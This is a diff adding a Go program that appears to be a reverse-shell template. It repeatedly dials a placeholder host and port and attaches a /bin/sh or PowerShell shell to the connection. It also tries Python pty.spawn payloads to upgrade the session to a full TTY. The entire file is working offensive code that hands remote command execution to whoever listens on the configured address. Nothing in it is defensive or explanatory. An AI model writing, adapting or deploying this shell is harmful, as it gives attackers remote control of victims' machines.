@@ -1,0 +1,64 @@
+package main
+
+import (
+	"net"
+	"os/exec"
+	"runtime"
+	"time"
+)
+
+var linuxTestPayloadsTTY = map[int]string{
+	1: `/usr/bin/python -c 'import pty; pty.spawn("/bin/bash -c exit 0")'; exit`,
+	2: `/usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/bash -c exit 0")'; exit`,
+	3: `/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash -c exit 0")'; exit`}
+var linuxPayloadsTTY = map[int]string{
+	1: `/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'; exit`,
+	2: `/usr/bin/python2.7 -c 'import pty;pty.spawn("/bin/bash")'; exit`,
+	3: `/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'; exit`}
+var windowsTestPayloadsTTY = map[int]string{}
+var windowsPayloadsTTY = map[int]string{}
+
+func main() {
+	reverseShell("template-host", "template-port")
+}
+
+func reverseShell(host string, port string) {
+	for {
+		connexion, err := net.Dial("tcp", host+":"+port)
+		if err != nil {
+			time.Sleep(2 * time.Second)
+		} else {
+			connexion.Write([]byte("[+] Connected to " + connexion.LocalAddr().String() + "\n"))
+			var shellProgram, payload string
+			if runtime.GOOS == "windows" {
+				shellProgram = "powershell.exe"
+				payload = windowsPayloadsTTY[findPayload(connexion, windowsTestPayloadsTTY, shellProgram)]
+			} else {
+				shellProgram = "/bin/sh"
+				payload = linuxPayloadsTTY[findPayload(connexion, linuxTestPayloadsTTY, shellProgram)]
+			}
+			spawnShell(connexion, shellProgram, "-c", payload)
+			connexion.Close()
+		}
+	}
+}
+
+func spawnShell(connexion net.Conn, shellProgram string, arguments ...string) {
+	connexion.Write([]byte("[+] Shell spawned.\n[!] Please type \"exit\" to exit the shell or the process will freeze server-side.\n"))
+	shell := exec.Command(shellProgram, arguments...)
+	shell.Stdout, shell.Stderr, shell.Stdin = connexion, connexion, connexion
+	shell.Run()
+}
+
+func findPayload(connexion net.Conn, payloads map[int]string, shellProgram string) int {
+	connexion.Write([]byte("[+] Trying payloads...\n"))
+	for i, payload := range payloads {
+		err := exec.Command(shellProgram, "-c", payload).Run()
+		if err == nil {
+			connexion.Write([]byte("[+] Payload worked ! Spawning TTY shell.\n"))
+			return i
+		}
+	}
+	connexion.Write([]byte("[-] Any payload worked, spawning native shell.\n"))
+	return -1
+}
